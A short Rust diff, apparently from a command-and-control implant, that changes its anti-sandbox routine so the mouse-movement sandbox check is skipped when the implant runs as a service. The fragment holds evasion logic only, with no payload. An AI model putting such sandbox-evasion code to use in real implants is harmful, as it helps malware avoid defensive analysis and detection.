@@ -12,19 +12,25 @@ pub fn anti_sandbox() {
 
     #[cfg(feature = "sandbox_trig")]
     {
-        use crate::anti_sandbox::trig::trig_mouse_movements;
+        use std::sync::atomic::Ordering;
 
-        #[cfg(debug_assertions)]
-        use shared::pretty_print::print_info;
+        use crate::entry::IS_IMPLANT_SVC;
+        // We cannot do this check when running as a svc
+        if !IS_IMPLANT_SVC.load(Ordering::SeqCst) {
+            use crate::anti_sandbox::trig::trig_mouse_movements;
 
-        #[cfg(debug_assertions)]
-        print_info("Waiting on trig test completion...");
+            #[cfg(debug_assertions)]
+            use shared::pretty_print::print_info;
 
-        // N.b. this could block for a period of time; but will not panic. See function for more details.
-        trig_mouse_movements();
+            #[cfg(debug_assertions)]
+            print_info("Waiting on trig test completion...");
 
-        #[cfg(debug_assertions)]
-        print_info("Trig test complete..");
+            // N.b. this could block for a period of time; but will not panic. See function for more details.
+            trig_mouse_movements();
+
+            #[cfg(debug_assertions)]
+            print_info("Trig test complete..");
+        }
     }
 
     #[cfg(feature = "sandbox_mem")]
